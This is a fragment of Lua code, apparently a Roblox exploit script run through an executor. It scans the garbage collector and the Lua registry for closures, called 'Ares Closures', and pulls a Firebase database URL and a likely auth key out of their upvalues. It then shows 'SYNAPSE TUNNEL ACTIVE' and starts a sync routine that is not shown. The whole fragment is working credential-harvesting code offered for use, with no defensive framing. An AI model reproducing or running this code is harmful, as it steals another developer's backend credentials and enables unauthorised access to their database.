-- 3. SIGNAL & UPVALUE REFLECTION (ZERO HOOK)
-- ========================================== --
task.spawn(function()
    while not TARGET_URL do
        -- 1. Deep Upvalue Scan (Searching Ares Closures)
        for _, f in pairs(getgc()) do
            if type(f) == "function" and islclosure(f) then
                local upvals = getupvalues(f)
                for _, uv in pairs(upvals) do
                    if type(uv) == "string" and uv:find("firebaseio.com") then
                        local capUrl = uv:match("(https://[%w%-]+%.firebaseio%.com)")
                        if capUrl and not TARGET_URL then
                            TARGET_URL = capUrl
                            Status.Text = "● STATUS: 🟢 SYNAPSE TUNNEL ACTIVE"
                            Status.TextColor3 = Color3.fromRGB(0, 255, 100)
                            StartSync()
                        end
                    elseif type(uv) == "string" and #uv > 30 and not uv:find("/") then
                        TARGET_AUTH = uv
                    end
                end
            end
        end

        -- 2. Registry Analysis
        if not TARGET_URL then
            for _, v in pairs(getreg()) do
                if type(v) == "table" and v.Url and tostring(v.Url):find("firebase") then
                    TARGET_URL = tostring(v.Url):match("(https://[%w%-]+%.firebaseio%.com)")
                    TARGET_AUTH = v.Auth or v.Key
                end
            end
        end
        task.wait(2)
    end
end)
